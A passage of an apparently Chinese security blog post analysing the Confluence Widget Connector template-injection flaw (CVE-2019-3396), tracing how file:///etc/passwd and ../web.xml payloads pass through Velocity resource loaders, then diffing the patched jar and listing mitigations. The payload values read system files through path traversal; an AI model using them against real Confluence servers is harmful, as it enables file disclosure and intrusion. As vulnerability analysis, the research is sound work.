<p>再看看<code>file:///etc/passwd</code>的情况：<br>先是第一个com.atlassian.confluence.setup.velocity.HibernateResourceLoader，依然返回null，然后是第二个org.apache.velocity.runtime.resource.loader.FileResourceLoader，<br><img src="https://img-blog.csdnimg.cn/20190411111450807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>经过<code>normalizePath()</code>之后，变成了<code>/file:/etc/passwd</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">inputStream = <span class="keyword">this</span>.findTemplate(path, template);</div></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2019041111170370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跟进findTemplate()方法。<br>经过拼接之后，file的值变成了<code>/Users/caiqiqi/repos/atlassian-confluence-6.9.0/confluence/file:/etc/passwd</code>。这个file值不能canRead(),所以不能进入<code>if (file.canRead())</code>，直接返回null。</p>
<blockquote>
<p>The canRead()function is a part of File class in Java . This function determines whether the program can read the file denoted by the abstract path name.The function returns true if the abstract file path exists and the application is allowed to read the file.</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20190411111929228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>返回抛出ResourceNotFoundException异常。<br><img src="https://img-blog.csdnimg.cn/20190411112202417.png" alt="在这里插入图片描述"><br>然后是第三个，org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader，</p>
<p><img src="https://img-blog.csdnimg.cn/20190411113520940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>/Library/Java/JavaVirtualMachines/jdk1.8.0_191.jdk/Contents/Home/src.zip!/java/lang/ClassLoader.java<br><img src="https://img-blog.csdnimg.cn/20190411145914811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后是BundleDelegatingClassLoader：依然返回null，<br>然后交给atlassian-confluence-6.9.0/lib/catalina.jar!/org/apache/catalina/loader/WebappClassLoaderBase.class的getResourceAsStream()<br><img src="https://img-blog.csdnimg.cn/20190411150822161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190411150945817.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019041115103617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>atlassian-confluence-6.9.0/confluence/WEB-INF/lib/org.apache.felix.framework-4.2.1.jar!/org/apache/felix/framework/URLHandlersStreamHandlerProxy.class的openConnection()<br><img src="https://img-blog.csdnimg.cn/20190411151840613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最终将访问url：file:///etc/passwd的内容写到writer中，<br><img src="https://img-blog.csdnimg.cn/20190411114756227.png" alt="在这里插入图片描述"></p>
<p>对于<code>../web.xml</code>的payload，<br><img src="https://img-blog.csdnimg.cn/20190411171135307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>由于是直接跟webapps没目录进行了拼接，这里可以进行路径穿越，进入上一级目录。</p>
<p><img src="https://img-blog.csdnimg.cn/20190410185817574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>atlassian-confluence-6.9.0/confluence/WEB-INF/lib/velocity-1.6.4-atlassian-9.jar!/org/apache/velocity/runtime/parser/node/SimpleNode.class的<br><img src="https://img-blog.csdnimg.cn/20190410190450186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>atlassian-confluence-6.9.0/confluence/WEB-INF/lib/velocity-1.6.4-atlassian-9.jar!/org/apache/velocity/runtime/parser/node/ASTSetDirective.class的render()方法。<br><img src="https://img-blog.csdnimg.cn/20190410211531176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>this.left 为<code>org.apache.velocity.runtime.parser.node.ASTReference</code><br>this.right为<code>org.apache.velocity.runtime.parser.node.ASTExpression</code>。<br>执行命令的过程就是一直调用<code>org.apache.velocity.runtime.parser.node.ASTReference</code>的<code>execute()</code>方法的过程。</p>
<h3 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h3><p>下载atlassian-confluence-6.13.2（存在漏洞版）和atlassian-confluence-6.13.3（修复版）<br>提取其中的widgetconnector-3.1.3.jar和widgetconnector-3.1.4.jar，用jd导出java代码，然后用icdiff进行对比。（论好的diff工具的重要性！）<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">icdiff widgetconnector-3.1.3/com/atlassian/confluence/extra/widgetconnector/WidgetMacro.java widgetconnector-3.1.4/com/atlassian/confluence/extra/widgetconnector/WidgetMacro.java</div></pre></td></tr></table></figure></p>
<p><img src="https://img-blog.csdnimg.cn/2019041301181152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>给出了一个列表，这个列表里有一个字符串，<code>_template</code>，对于HTTP POST请求过来的参数parameter上进行解析时，去除掉<code>_template</code>这个字段，从而杜绝了从<code>_template</code>字段进行模板注入的风险。#TODO 对比其他jar包，查找有没有关于此漏洞或者其他方面的发现。</p>
<h3 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h3><p>禁用几个插件，升级，然后重新开启。如果不能升级的话，就只能防火墙拦截了。<br><img src="https://img-blog.csdnimg.cn/20190408134201689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><ul>
<li><a href="https://jira.atlassian.com/browse/CONFSERVER-57974" target="_blank" rel="external">https://jira.atlassian.com/browse/CONFSERVER-57974</a></li>
<li><a href="https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/20190404_WEB_Confluence_path_traversal.py">https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/20190404_WEB_Confluence_path_traversal.py</a></li>
<li><a href="https://chybeta.github.io/2019/04/06/Analysis-for-%E3%80%90CVE-2019-3396%E3%80%91-SSTI-and-RCE-in-Confluence-Server-via-Widget-Connector/" target="_blank" rel="external">https://chybeta.github.io/2019/04/06/Analysis-for-%E3%80%90CVE-2019-3396%E3%80%91-SSTI-and-RCE-in-Confluence-Server-via-Widget-Connector/</a></li>
<li><a href="https://paper.seebug.org/884/" target="_blank" rel="external">https://paper.seebug.org/884/</a></li>
</ul>


                <hr>

                

                <ul class="pager">
                    
                        <li class="previous">
                            <a href="/2019/11/03/Confluence路径穿越漏洞-CVE-2019-3398/" data-toggle="tooltip" data-placement="top" title="Confluence路径穿越漏洞(CVE-2019-3398)">&larr; Previous Post</a>
                        </li>
                    
                    
                        <li class="next">
                            <a href="/2019/11/03/Confluence敏感信息泄露漏洞-CVE-2019-3394/" data-toggle="tooltip" data-placement="top" title="Confluence敏感信息泄露漏洞(CVE-2019-3394)">Next Post &rarr;</a>
                        </li>
                    
                </ul>

                

                

            </div>
    <!-- Side Catalog Container -->
        

    <!-- Sidebar Container -->

            <div class="
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                sidebar-container">

                <!-- Featured Tags -->
                
                <section>
                    <!-- no hr -->
                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
                    <div class="tags">
                       
                          <a class="tag" href="/tags/#Confluence" title="Confluence">Confluence</a>
                        
                          <a class="tag" href="/tags/#CVE-2019-396" title="CVE-2019-396">CVE-2019-396</a>
                        
                    </div>
                </section>
                

                <!-- Friends Blog -->
                
            </div>

        </div>
    </div>
</article>









    <!-- Footer -->
    <!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">
                
                
                

                
                    <li>
                        <a target="_blank" href="http://weibo.com/2963784630">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                

                

                
                    <li>
                        <a target="_blank"  href="https://github.com/caiqiqi">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                

                

                </ul>
                <p class="copyright text-muted">
                    Copyright &copy; caiqiqi 2019 
                    <br>
                    Theme by <a href="http://huangxuan.me">Hux</a> 
                    <span style="display: inline-block; margin: 0 5px;">
                        <i class="fa fa-heart"></i>
                    </span> 
                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a> | 
                    <iframe
                        style="margin-left: 2px; margin-bottom:-5px;"
                        frameborder="0" scrolling="0" width="91px" height="20px"
                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
                    </iframe>
                </p>
            </div>
        </div>
    </div>
</footer>

<!-- jQuery -->
<script src="/js/jquery.min.js"></script>

<!-- Bootstrap Core JavaScript -->
<script src="/js/bootstrap.min.js"></script>

<!-- Custom Theme JavaScript -->
<script src="/js/hux-blog.min.js"></script>


<!-- async load function -->
<script>
    function async(u, c) {
      var d = document, t = 'script',
          o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
      s.parentNode.insertBefore(o, s);
    }
</script>

<!-- 
     Because of the native support for backtick-style fenced code blocks 
     right within the Markdown is landed in Github Pages, 
     From V1.6, There is no need for Highlight.js, 
     so Huxblog drops it officially.

     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
-->
<!--
    <script>
        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
            hljs.initHighlightingOnLoad();
        })
    </script>
    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
-->


<!-- jquery.tagcloud.js -->
<script>
    // only load tagcloud.js in tag.html
    if($('#tag_cloud').length !== 0){
        async("https://github.com/caiqiqi/js/jquery.tagcloud.js",function(){
            $.fn.tagcloud.defaults = {
                //size: {start: 1, end: 1, unit: 'em'},
                color: {start: '#bbbbee', end: '#0085a1'},
            };
            $('#tag_cloud a').tagcloud();
        })
    }
</script>

<!--fastClick.js -->
<script>
    async("http://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
        var $nav = document.querySelector("nav");
        if($nav) FastClick.attach($nav);
    })
</script>


<!-- Google Analytics -->




<!-- Baidu Tongji -->


<!-- Side Catalog -->




<!-- Image to hack wechat -->
<img src="https://github.com/caiqiqi/img/icon_wechat.png" width="0" height="0" />
<!-- Migrate from head to bottom, no longer block render and still work -->

</body>

</html>
